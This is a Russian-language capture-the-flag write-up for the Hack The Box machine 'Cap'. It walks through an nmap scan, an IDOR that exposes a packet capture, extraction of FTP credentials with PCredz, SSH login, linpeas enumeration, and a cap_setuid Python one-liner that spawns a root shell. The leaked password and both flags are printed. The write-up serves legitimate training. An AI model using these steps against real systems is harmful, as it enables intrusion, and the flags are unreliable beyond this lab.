# Cap - Hack The Box
---

# Nmap Scan

Начинаю со стандартного сканирования.

```bash
┌──(jekawhitehat㉿kali)-[~]
└─$ nmap -A -T4 10.129.110.81
```

Результат:

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Gunicorn
```

---
Открыто 3 порта 

| Port | Service |
|------|------|
| 21 | FTP |
| 22 | SSH | 
| 80 | HTTP | 

---

# Web разведка

На этапе сбора информации всегда записывайте найденные версии приложений, формы авторизации, логины, пароли и прочую информацию которую далее можно будет использовать а еще лучше пишите свои врайтапы, чтобы после прохождения лабы можно было пересмотреть свои подходы

Перехожу в браузере по адресу 
```text
http://10.129.110.81
```

Сразу замечаю интересный момент:

- пользователь уже авторизован
- отображается имя `Nathan`

Это выглядит как внутренняя панель мониторинга или какой-то дашборд тех. поддержки

---

# Намёк на возможный IDOR

Во время исследования сайта обращаю внимание на эндпоинт:

```text
http://10.129.110.81/data/1
```

Числовой идентификатор в URL - когда его вижу сразу мысли о проверке на `IDOR`.

---

# Тестирование IDOR как можно проверить

Можно перебирать ID через:

- Burp Suite (intruder)
- Ручное перечисление
Я проверю руками и если их будет слишком много, начну использовать Burp 

`ID 1` не содержит полезных данных, это стартовый id  который мне присвоен. В .pcap файле id-1 нет ничего, ни кредов и т.д

Пробую:

```text
http://10.129.110.81/data/0
```

И получаю другой `.pcap` файл.

Также нахожу ещё несколько ID:

```text
2
3
4
...
до 7, далее содержимое файлов = 0 байт
```

Поссле исследования стало понятно, что полезная информация содержалась только в `0.pcap`.

---

# Разбор .pcap файла

При работе с `.pcap` файлами я всегда проверяю их на наличие учетных данных, протоколов, форм авторизации и т.д

Для этого использую:

- PCredz
- Wireshark
- tshark

В данном случае использую `PCredz`.

---

# Извлечение учетных данных из 0.pcap

Для начала его надо загрузить и запустить:
```bash
sudo apt update 
sudo apt install -y python3-pip python3-venv libpcap-dev file build-essential
git clone https://github.com/lgandx/PCredz.git
cd PCredz
python3 -m venv venv && source venv/bin/activate
pip install python-libpcap
pip3 install pcapy-ng
```

Запускаю:

```bash
┌──(jekawhitehat㉿kali)-[~]
└─$ python3 ./Pcredz -f ~/Downloads/0.pcap
```

Результат: пользователь nathan логинился на FTP с паролем 'Buck3tH4TF0RM3!' (структру его логинов видно если открыть wireshark в GUI)

```text
FTP User: nathan
FTP Pass: Buck3tH4TF0RM3!

ВАЖНО! Эти учетные данные (логин и пароль или только логин или только пароль) могут пригодится и дальше, запишите их и применяйте по мере необходимости.
```

С этими учетными данными я буду двигаться дальше

---

# Дорога к получению user.txt

Проверяю SSH доступ.

```bash
┌──(jekawhitehat㉿kali)-[~]
└─$ ssh nathan@10.129.110.81
```

---

# User Flag

Проверяю домашнюю директорию.

```bash
┌──(nathan㉿cap)-[~]
└─$ ls
```

```text
user.txt
```

Читаю флаг.

```bash
┌──(nathan㉿cap)-[~]
└─$ cat user.txt
0f2e7a3e4f8b6ec470f7435e592b0b5c
```

---

# Повышение привелегий

Проверяю права sudo, id, getcap, uname -r и т.д, если будет мало загружу linepas.sh скрипт 

```bash
┌──(nathan㉿cap)-[~]
└─$ sudo -l
Sorry, user nathan may not run sudo on cap.
```

Это значит, что ничего я как sudo не могу запускать в этом случае

---

# LinPEAS Enumeration

Ниже показываю как загрузить Linpeas и запустить

`на Kali локально`

```bash
┌──(jekawhitehat㉿kali)-[~]
└─$ wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh  <-- загрузка скрипта себе на кали (в любую папку)
```

```bash
┌──(jekawhitehat㉿kali)-[~]
└─$ python3 -m http.server 8090    (запуск http.server обязательно в той папке, где лежит скрипт linpeas.sh)
```

`на атакуемой машине будучи nathan`

```bash
nathan㉿cap: wget http://10.8.8.8:8090/linpeas.sh     ← загрузка скрипта на машину (10.8.8.8) нужно заменить на свой ip VPN htb
```

```bash
nathan㉿cap: chmod +x linpeas.sh   - дать права на исполнение файла
```

Запуск:

```bash
nathan㉿cap: ./linpeas.sh
```
В результатах работы скрипта замечаю подозрительные разрешения linux которые подсветил Linepas

```text
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

---

# Да кто такой ваш этот `cap_setuid`

Это разрешение позволяет процессу менять свой UID и если бинарник python имеет эту capability, можно повысить привилегии до `root` без `sudo`
Подробная техника повышения привелегий с этим разрешением описана тут: https://medium.com/@forgecode/linux-privilege-escalation-via-cap-setuid-gaining-root-with-python-ecca7cab716e

```python
python
>>> import os
>>> os.setuid(0)
>>> os.system('whoami')
>>> os.system('sh')
```

---

# Поиск на GTFObins

Проверяю GTFOBins и нахожу payload для повыешния привелегий  https://gtfobins.org/gtfobins/setcap/#privilege-escalation

Ввожу команду, она создаст оболочку root и я смогу прочитать root.txt файл

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

Получаю root shell.

```text
# whoami
root
```

---

# Root Flag

Читаю `root.txt`.

```bash
cat /root/root.txt
55e4bd161d130c4f197a2745936e844f
```

---
